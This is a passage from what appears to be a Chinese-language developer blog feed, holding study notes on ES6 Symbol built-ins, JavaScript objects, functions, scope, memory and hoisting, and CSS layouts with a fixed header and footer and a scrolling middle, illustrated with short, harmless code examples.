值</li><li><code>Symbol.keyFor</code>方法返回一个已登记的 Symbol 类型值的key</li><li><code>Symbol.hasInstance</code>：当其他对象使用instanceof运算符，判断是否为该对象的实例时，会调用这个方法<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Even</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>hasInstance<span class="token punctuation">]</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">Number</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">1</span> <span class="token keyword">instanceof</span> <span class="token class-name">Even</span> <span class="token comment" spellcheck="true">// false</span><span class="token number">2</span> <span class="token keyword">instanceof</span> <span class="token class-name">Even</span> <span class="token comment" spellcheck="true">// true</span><span class="token number">12345</span> <span class="token keyword">instanceof</span> <span class="token class-name">Even</span> <span class="token comment" spellcheck="true">// false</span></code></pre></li><li><code>Symbol.isConcatSpreadable</code>：属性等于一个布尔值，表示该对象用于Array.prototype.concat()时，是否可以展开<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//数组的默认行为是可以展开;类似数组的对象正好相反，默认不展开</span><span class="token keyword">let</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr2<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>isConcatSpreadable<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>arr2<span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// ['a', 'b', ['c','d'], 'e']</span></code></pre></li><li><code>Symbol.species</code>：属性，指向一个构造函数。创建衍生对象时，会使用该属性<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">MyArray</span> <span class="token keyword">extends</span> <span class="token class-name">Array</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token keyword">get</span> <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>species<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> Array<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> b <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>x <span class="token operator">=</span><span class="token operator">></span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>b <span class="token keyword">instanceof</span> <span class="token class-name">MyArray</span> <span class="token comment" spellcheck="true">// false</span>b <span class="token keyword">instanceof</span> <span class="token class-name">Array</span> <span class="token comment" spellcheck="true">// true</span></code></pre></li><li><code>Symbol.match</code>：当执行<code>str.match(myObject)</code>时，如果该属性存在，会调用它，返回该方法的返回值</li><li><code>Symbol.replace</code>：指向一个方法，当该对象被<code>String.prototype.replace</code>方法调用时，会返回该方法的返回值</li><li><code>Symbol.search</code>：属性，指向一个方法，当该对象被<code>String.prototype.search</code>方法调用时，会返回该方法的返回值</li><li><code>Symbol.split</code>：指向一个方法，当该对象被<code>String.prototype.split</code>方法调用时，会返回该方法的返回值</li><li><code>Symbol.iterator</code>：指向该对象的默认遍历器方法；对象进行for…of循环时，会调用Symbol.iterator方法，返回该对象的默认遍历器<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Collection</span> <span class="token punctuation">{</span>  <span class="token operator">*</span><span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">yield</span> <span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> myCollection <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myCollection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>myCollection<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> value <span class="token keyword">of</span> myCollection<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript的变量、对象及函数(重要基础知识总结)</title>
      <link href="/2018/07/23/javascript-de-bian-liang-dui-xiang-ji-han-shu-chong-yao-ji-chu-zhi-shi-zong-jie/"/>
      <url>/2018/07/23/javascript-de-bian-liang-dui-xiang-ji-han-shu-chong-yao-ji-chu-zhi-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>[目录]</p><ul><li><a href="#参考书籍">参考书籍</a></li><li><a href="#对象">对象</a></li><li><a href="#引用类型">引用类型</a></li><li><a href="#函数function">函数Function</a></li><li><a href="#变量、作用域和内存">变量、作用域和内存</a></li><li><a href="#变量提升和函数提升">变量提升和函数提升</a></li></ul><h4 id="参考书籍"><a href="#参考书籍" class="headerlink" title="参考书籍"></a>参考书籍</h4><ul><li>《JavaScript高级程序设计（第三版）》</li></ul><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><ul><li><strong>简单数据类型</strong>： 数字、字符串、布尔值、null、undefined</li><li><strong>复杂数据类型</strong>：对象（Object, Array, RegExp, function）</li><li>检测基本类型用<code>typeof</code>;对象或者null会返回“object”;检测引用类型用<code>instanceof</code></li><li>JS包含一种<strong>原型链</strong>属性，允许对象继承另一个对象的属性，正确使用能减少对象初始化消耗的时间和内存。</li><li>对象是一组数据和功能的集合，创建方法： <code>var obj = new ObjectType()</code></li><li>每个Object实例都具有的属性和方法：<ul><li><strong>constructor</strong>: 保存创建当前对象的函数</li><li><strong>hasOwnProperty(<em>propertyName</em>)</strong>: 检查给定的属性在当前对象实例中是否存在（不是在对象的原型中），参数是以字符串形式传入</li><li><strong>isPropertyOf(<em>object</em>)</strong>: 用于检查传入的对象是否是当前对象的原型；</li><li><strong>propertyIsEnumerable(<em>propertyName</em>)</strong>: 用于检查给定的属性是否能够使用for-in语句</li><li><strong>toLocalString()</strong>: 返回对象的字符串表示，与执行环境的地区相对应</li><li><strong>toString()</strong>: 返回对象的字符串表示</li><li><strong>valueOf()</strong>: 返回对象的字符串、数值或者布尔表示</li></ul></li><li>单体内置对象：<strong>Global</strong>and<strong>Math</strong><ul><li>URI编码方法：<ul><li><em>encodeURI()</em>: 只替换空格</li><li><em>encodeURIComponent()</em>: 使用对应的编码替换所有非字符字母数字字符。</li></ul></li></ul></li><li>创建对象<ul><li>工厂模式：抽象了创建具体对象的过程，用函数来封装以特定接口创建对象的细节：<pre><code>function createPerson(name, age) {var o = new Object();o.name = name;o.age = age;o.sayName = function() { alert(this.name);}return o;}var person = createPerson(&quot;John&quot;, 23);</code></pre></li><li>构造函数模式： 没有显式创建对象，直接将属性和方法赋给this对象，没有return语句<pre><code>function Person(name, age) {this.name = name;this.age = age;this.sayName = function() {  alert(this.name);};}//创建一个新对象，将构造函数的作用域赋给新对象，执行构造函数中的代码，返回新对象var person = new Person(&quot;John&quot;, 22);</code></pre><ul><li>缺点：每个方法都要在每个实例上重新创建一遍，实际上创建两个完成同样任务的实例没有必要可以将函数定义转移到构造函数外。e.g.<code>this.sayName = sayName</code></li></ul></li><li>原型模式<ul><li>我们创建的每个函数都有一个prototype(原型)属性，包含由特定类型的所有实例共享的属性和方法。</li></ul></li></ul></li></ul><h4 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h4><ul><li>对象是某特定引用类型的实例，新对象是使用new操作符后跟一个构造函数来创建的。</li><li>创建Object实例有两种方式：<ul><li>构造函数：<code>var obj = new Object();</code></li><li>对象字面量 <code>var obj = {name: propertyName};</code></li><li>访问对象属性：<ul><li>点表示法(建议)</li><li>方括号表示法：可使用变量作为<em>propertyName</em>,属性名是关键字或者保留字（比如空格，非字母非数字）</li></ul></li></ul></li><li><p><em>Array</em></p><ul><li>创建数组的基本方法：<ul><li>构造函数 <code>var arr = new Array()</code><ul><li>可传递数量：<code>var arr = new Array(20)</code>//length = 20</li><li>可传递项：<code>var arr = new Array(&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;)</code></li></ul></li><li>数组字面量：<code>var arr = []</code><ul><li>可传递项: <code>var arr = [2,3,4]</code></li></ul></li></ul></li><li>length是可读写的</li><li>ES5新增检测数组的方法：<code>Array.isArray(value)</code></li><li><strong>栈方法</strong>：push, pop</li><li><strong>队列方法</strong>： shift, push; 反方向：unshift, pop</li><li><strong>重排序方法</strong>：<ul><li><em>reverse()</em>：反转数组项</li><li><em>sort()</em>: 默认升序，将每个数组项通过toString()方法转型；可自定义比较函数作为参数传递给sort()方法；<pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> compare_ascend<span class="token punctuation">(</span>value1 , value2<span class="token punctuation">)</span> <span class="token punctuation">{</span>if<span class="token punctuation">(</span>value1 <span class="token operator">&lt;</span> value2<span class="token punctuation">)</span> <span class="token punctuation">{</span>//如果第一个值应该在第二个值之前返回-1  <span class="token keyword">return</span> -1<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>value1 <span class="token operator">></span> value2<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> 1<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> compare_num_ascend<span class="token punctuation">(</span>value1 , value2<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> value1 - value2<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul></li><li>其他操作：<ul><li><em>concat()</em> : 创建当前数组的副本，将接收到的参数添加到副本的末尾。</li><li><em>slice()</em> : 基于当前数组的一个或者多个项创建一个新数组，接受1个或2个项目，该数组的起始位置和结束位置（不包含结束位置的项）</li><li><em>splice()</em>:<ul><li>删除：2个参数：要删除的第一项的位置，要删除的项数</li><li>插入：3个参数：起始位置，0，要插入的项(可传入多个项)</li><li>替换：3个参数： 起始位置，要删除的项数，要插入的任意数目的项</li></ul></li><li><em>indexOf()</em> : 要查找的项，（可选的）查找起点位置的索引，从数组开头即0开始查找</li><li><em>lastIndexOf()</em>: 与上相同，从数组末尾开始查找</li></ul></li><li>迭代方法：<ul><li><em>every()</em>: 运行给定函数，如果每一项都返回true,结果是true</li><li><em>filter()</em>: 运行给定函数，返回true项组成的数组</li><li><em>forEach()</em>: 运行给定函数，无返回值</li><li><em>map()</em>: 运行给定函数，返回每次函数调用的结果组成的数组</li><li><em>some()</em>: 运行给定函数，如果任一项返回true，结果是true</li></ul></li><li>归并方法：<ul><li><em>reduce()</em>: 参数：前一个值，当前值，项的索引，数组对象;第一次prev=1</li><li><em>reduceRight()</em>: 参数与上相同，从数组最后一项开始</li></ul></li></ul></li><li><p><em>RegExp</em>类型</p><ul><li>支持正则表达式</li><li>标志位：<ul><li>g: 全局，匹配所有，而非发现第一个就停止</li><li>i: 不区分大小写</li><li>m: 多行</li></ul></li></ul></li></ul><h4 id="函数Function"><a href="#函数Function" class="headerlink" title="函数Function"></a>函数Function</h4><ul><li><strong>参数</strong>： ECMAScript函数不介意传递进来多少个参数，也不在乎参数的数据类型，函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。命名的参数只提供便利，但不是必需的。修改arguments的值会同步更改对应命名参数的值，反之同样。</li><li><strong>没有重载</strong>： 接受的参数的类型和数量不能区分，后定义函数会覆盖先定义函数。</li><li>创建函数的方式:<ul><li>函数字面量/函数表达式<pre><code>var sum = function (a, b) {return a+b;};</code></pre></li><li>函数声明<pre><code>function sum (a, b) {return a+b;};</code></pre></li><li>构造函数(不推荐)<pre><code>var sum = new Function(&quot;a&quot;, &quot;b&quot;, &quot;return a+b&quot;)</code></pre></li></ul></li><li>函数声明与函数表达式的区别：<br>解析器会率先读取函数声明，并使其在任何代码之前可用；函数表达式必须等到解析式执行到它所在的代码行，才会真正被执行。</li><li>函数内部属性<ul><li>arguments这个对象有一个名叫<strong>callee</strong>的属性，该属性是一个指针，指向拥有这个arguments对象的函数。在递归中可用它来消除函数的执行与函数名紧密耦合的现象：<em>arguments.callee()</em></li><li><strong>caller</strong>是函数对象的一个属性，保存调用当前函数的引用。</li><li>严格模式下，callee和caller都会报错。</li><li><em>apply()</em>和<em>call()</em>两个方法的用途都是在特定的作用域中调用函数，实际等于设置函数体内this对象的值。<ul><li><em>apply()</em> : 两个参数：一个是在其中运行函数的作用域，一个是参数数组。</li><li><em>call()</em>: 方法相同，但参数是直接接收。</li><li><strong>能够扩充函数赖以运行的作用域</strong>，对象与方法不需要有任何耦合。</li></ul></li></ul></li><li>函数调用方式<ul><li>函数调用模式</li><li>方法调用模式</li><li>构造器调用模式</li><li>上下文调用模式，通过call和apply</li></ul></li></ul><h4 id="变量、作用域和内存"><a href="#变量、作用域和内存" class="headerlink" title="变量、作用域和内存"></a>变量、作用域和内存</h4><ul><li>ECMAScript<strong>变量</strong>包含两种不同数据类型的值：<ul><li><strong>基本数据类型</strong>：基本数据类型是<strong>按值访问</strong>的，不能给基本类型的值添加属性，简单复制会新分配位置和赋值；在内存中占据固定大小的空间，因此被保存在栈内存。</li><li><strong>引用数据类型</strong>： 引用类型的值是<strong>按引用访问</strong>的，可以添加、改变、删除其属性和方法，复制只是复制指针，指向同一对象。保存在堆内存。</li></ul></li><li><strong>传递参数</strong>： 变量按值传递，但有按值访问和按变量访问。一个特殊的例子：<pre><code>function setName(obj) {obj.name = &quot;lucy&quot;;obj = new Object();//局部对象会在执行完毕后立即被销毁obj.name = &quot;susie&quot;;}var person = new Object();setName(person);console.log(person.name);//lucy</code></pre></li><li><strong>执行环境</strong>： 定义了变量或者函数有权访问的其他数据，每个执行环境都有与之关联的<strong>变量对象</strong>，环境中所有变量和函数都保存在这个对象中，用于解析器。<strong>全部执行环境</strong>是最外围的执行环境，在Web浏览器中，全局执行环境是<strong>window对象</strong>。每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就会被推入一个环境栈中，执行完毕后弹出。</li><li><strong>作用域链</strong>：<strong>用于搜索变量和函数</strong>。当代码在一个环境中执行时，会创建变量对象的一个作用域链，作用域链的用途是保证对执行环境有权访问所有变量和函数的有序访问。作用域链的前端是当前执行的代码所在环境的变量对象，下一个是来自外部环境，全局执行环境的变量对象始终是作用域链中的最后一个对象。<strong>标识符解析</strong>是沿着作用域链一级一级搜索标识符的过程，搜索过程从前端开始逐级向后回溯，直到找到标识符为止。</li><li><strong>延长作用域链</strong>： <code>with</code> 、<code>try-catch</code></li><li><strong>没有块级作用域</strong>：<code>for</code>和<code>if</code>语句中声明的变量会添加到当前环境。</li><li><strong>作用域</strong>： 在编程语言中，作用于控制着变量和参数的可见性及生命周期，它减少了名称冲突，并提供了自动内存管理。</li><li><strong>垃圾收集</strong>：JS有<strong>自动垃圾收集机制</strong>，找出那些不在继续使用的变量，然后释放其占用的内存。垃圾收集器会按照固定的时间间隔(或代码执行中预定的收集时间)周期性地执行这一操作。<ul><li><strong>标识清除</strong>：标记与清除进入环境和离开环境，比如翻转特殊的位或者变量列表。运行的时候会给所有变量加上标记，去掉环境中的变量和被环境变量引用的变量的标记。</li><li><strong>引用计数</strong>：跟踪每个值被引用的次数。当声明了一个变量并将一个引用类型赋值给该变量时，这个值引用次数就是1，如果值又被赋给另一个变量，引用次数减1.当引用次数为0，垃圾收集器下次运行可以将其占用的内存空间回收。可能会遇到<strong>循环引用</strong>问题。为解决这个问题，最好将不引用的两个变量设为null。</li><li><strong>性能问题</strong>：在IE中如果一个脚本中初始包含临界值的变量(比如256个变量，4096个对象字面量，或64KB的字符串)时，如果周期性触发，垃圾收集机制可能要频繁运行，影响性能。IE7改写了，如果垃圾收集例程回收的内存分配量低于15%，则临界值加倍。</li><li><strong>管理内存</strong>：因为分配给Web浏览器的可用内存数量通常比分配给桌面的应用程序少，这样做主要是处于安全考虑率，目的是防止JS的网页耗尽全部系统内存而导致系统崩溃。优化内存占用最佳的方式是为执行中的代码只保留必要的数据。一旦数据不再有用，最好将其值设置为<code>null</code>来释放其引用。—-这个方法叫<strong>解除引用</strong>，多用于大多数全局变量和全局对象的属性。局部变量会在离开执行环境时自动被解除引用。解除引用真正的作用是让值脱离执行环境，以便垃圾回收器下次运行时将其回收。</li></ul></li><li>ES6新增的声明变量的方式：<strong>let</strong>,<strong>const</strong><ul><li><strong>var</strong>: 声明的变量的作用域是Function Scope,存在变量提升；在if，while，for等块级语句中声明的变量可在块级语句外访问</li><li><strong>let</strong>: 声明的变量的作用域是Block Scope,不存在变量提升</li><li><strong>const</strong>: 定义一个常量不可被分配，作用域规则与let类似，不存在变量提升</li></ul></li></ul><h4 id="变量提升和函数提升"><a href="#变量提升和函数提升" class="headerlink" title="变量提升和函数提升"></a>变量提升和函数提升</h4><p>在Javascript中变量及函数的声明都将被提升到作用域的最顶部。</p><ul><li>变量提升的简单例子<pre><code>//全局变量(已声明)console.log(glo_d)var glo_d = &quot;global&quot;console.log(glo_d)//全部变量(未声明)console.log(glo_ud)//函数声明g1();//1g2();//g2is not a functionfunction g1() {console.log(&quot;1&quot;);}var g2 = function() {console.log(&quot;2&quot;);}</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习之——上下固定中间自适应滚动布局</title>
      <link href="/2018/07/11/css-xue-xi-zhi-shang-xia-gu-ding-zhong-jian-zi-gua-ying-gun-dong-bu-ju/"/>
      <url>/2018/07/11/css-xue-xi-zhi-shang-xia-gu-ding-zhong-jian-zi-gua-ying-gun-dong-bu-ju/</url>
      
        <content type="html"><![CDATA[<p>html布局如下：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>HEADER<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MAIN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>FOOTER<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p><img src="/img/in-post/css-13.JPG" alt="效果"></p><h4 id="方法一：利用vh视图单位"><a href="#方法一：利用vh视图单位" class="headerlink" title="方法一：利用vh视图单位"></a>方法一：利用vh视图单位</h4><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.container</span> </span><span class="token punctuation">{</span>  <span class="token property">min-height</span><span class="token punctuation">:</span> <span class="token number">100</span>vh<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.header</span> </span><span class="token punctuation">{</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.footer</span> </span><span class="token punctuation">{</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">-webkit-calc</span><span class="token punctuation">(</span><span class="token number">100</span>vh - <span class="token number">80</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token number">100</span>vh - <span class="token number">80</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token property">overflow-y</span><span class="token punctuation">:</span> scroll<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>已知上下栏高度，计算中间部分应该占据的空间</li></ul><h4 id="利用flex布局"><a href="#利用flex布局" class="headerlink" title="利用flex布局"></a>利用flex布局</h4><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.container</span> </span><span class="token punctuation">{</span>  <span class="token property">display</span><span class="token punctuation">:</span>-webkit-box<span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span>-webkit-flex<span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span>-ms-flexbox<span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span>flex<span class="token punctuation">;</span>  <span class="token property">-webkit-box-orient</span><span class="token punctuation">:</span>vertical<span class="token punctuation">;</span>  <span class="token property">-webkit-flex-direction</span><span class="token punctuation">:</span>column<span class="token punctuation">;</span>  <span class="token property">-ms-flex-direction</span><span class="token punctuation">:</span>column<span class="token punctuation">;</span>  <span class="token property">flex-direction</span><span class="token punctuation">:</span>column<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span><span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.header</span>,<span class="token class">.footer</span></span><span class="token punctuation">{</span>  <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>  <span class="token property">-webkit-box-flex</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token property">-webkit-flex</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token property">-ms-flex</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token property">flex</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token property">overflow-y</span><span class="token punctuation">:</span> scroll<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>注意兼容，注意减号两边空格</li></ul><h4 id="利用position-absolute布局"><a href="#利用position-absolute布局" class="headerlink" title="利用position+absolute布局"></a>利用position+absolute布局</h4><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.container</span> </span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.header</span></span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.footer</span> </span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="利用position-fixed布局"><a href="#利用position-fixed布局" class="headerlink" title="利用position+fixed布局"></a>利用position+fixed布局</h4><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.container</span> </span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.header</span></span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.footer</span> </span><span class="token punctuation">{</span>  <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">40</span>px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token property">min-height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">40</span>px <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量、作用域和内存问题</title>
      <link href="/2018/07/11/bian-liang-zuo-yong-yu-he-nei-cun-wen-ti/"/>
      <url>/2018/07/11/bian-liang-zuo-yong-yu-he-nei-cun-wen-ti/</url>
      
